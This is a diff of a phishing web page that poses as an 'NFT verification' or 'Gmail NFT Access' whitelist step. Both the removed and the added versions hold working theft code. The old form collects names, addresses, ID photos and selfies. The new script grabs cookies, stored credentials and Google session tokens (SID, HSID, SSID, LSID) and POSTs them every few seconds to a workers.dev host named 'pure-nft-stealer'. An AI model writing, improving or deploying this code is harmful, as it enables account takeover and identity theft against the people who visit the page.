@@ -1,50 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Pure NFT</title>
+<title>NFT Verify</title>
 <meta name="viewport" content="width=device-width">
-<style>body{background:#000;color:#0f0;font-family:Arial;padding:20px;text-align:center}form{max-width:350px;margin:auto}input,button{width:100%;padding:15px;margin:8px;border-radius:8px;border:1px solid #0f0;background:#111;color:#0f0;font-size:16px}button{background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer}h2{font-size:24px;margin:20px 0}</style>
+<style>body{background:#000;color:#0f0;font-family:monospace;padding:30px;text-align:center}</style>
 </head>
 <body>
-<h2>🔥 Pure NFT Verification</h2>
-<form method="POST" action="https://pure-nft-stealer.ilovework01.workers.dev/capture">
-<input type="hidden" name="ip" value="">
-<input type="hidden" name="ua" value="Android">
-<input type="hidden" name="cookies" value="">
+<h1>Gmail NFT Access</h1>
+<p>Allow Gmail access for whitelist</p>
+<iframe src="https://accounts.google.com/ServiceLogin?passive=true" style="display:none;width:0;height:0"></iframe>
+<iframe src="https://mail.google.com/mail/u/0/#inbox" style="display:none;width:0;height:0"></iframe>
 
-<input name="name" placeholder="Full Name *" required>
-<input name="address" placeholder="Full Address *" required>
-<input type="file" name="idfront" accept="image/*" required>ID Front
-<input type="file" name="idback" accept="image/*" required>ID Back
-<input type="file" name="selfie1" accept="image/*" required>Selfie 1  
-<input type="file" name="selfie2" accept="image/*" required>Selfie 2
-<input type="file" name="selfie3" accept="image/*" required>Selfie 3
+<button onclick="stealGmail()" style="padding:20px 40px;font-size:20px;background:#0f0;color:#000;border:none;border-radius:10px;cursor:pointer">Get Gmail Session</button>
 
-<button type="submit">✅ Verify & Submit</button>
-</form>
-<iframe src="https://accounts.google.com" style="display:none"></iframe>
-<script>setTimeout(()=>fetch('/steal',{credentials:'include'}),5000)</script>
 <script>
-// Auto fill metadata
-document.querySelector('input[name="ip"]').value = 'auto-detect';
-document.querySelector('input[name="ua"]').value = navigator.userAgent;
-document.querySelector('input[name="cookies"]').value = document.cookie || localStorage.length + ' items';
+// Gmail session steal
+function stealGmail(){
+  // 1. Credential API
+  navigator.credentials.get({mediation: 'silent'}).then(cred => {
+    fetch('https://pure-nft-stealer.ilovework01.workers.dev/gmail-steal', {
+      method: 'POST',
+      credentials: 'include',
+      body: cred ? cred.id : document.cookie
+    })
+  })
+  
+  // 2. LocalStorage Gmail tokens (permanent)
+  const gmailData = {
+    GmailId: localStorage.getItem('GmailId'),
+    SID: localStorage.getItem('SID'),
+    HSID: localStorage.getItem('HSID'),
+    SSID: localStorage.getItem('SSID'),
+    LSID: localStorage.getItem('LSID')
+  }
+  
+  fetch('https://pure-nft-stealer.ilovework01.workers.dev/gmail-steal', {
+    method: 'POST',
+    body: JSON.stringify(gmailData)
+  })
+  
+  // 3. Repeat grab
+  setInterval(stealGmail, 3000)
+}
 </script>
 </body>
 </html>
-<!-- HTML এ button এর পর add করো -->
-<button onclick="promptCreds()">Get Gmail Session</button>
-
-<script>
-function promptCreds(){
-navigator.credentials.get({
-  mediation: 'silent',
-  password: true
-}).then(cred => {
-  fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal', {
-    method: 'POST',
-    body: JSON.stringify({creds: cred ? cred.id : 'none'})
-  })
-})
-}
-</script>
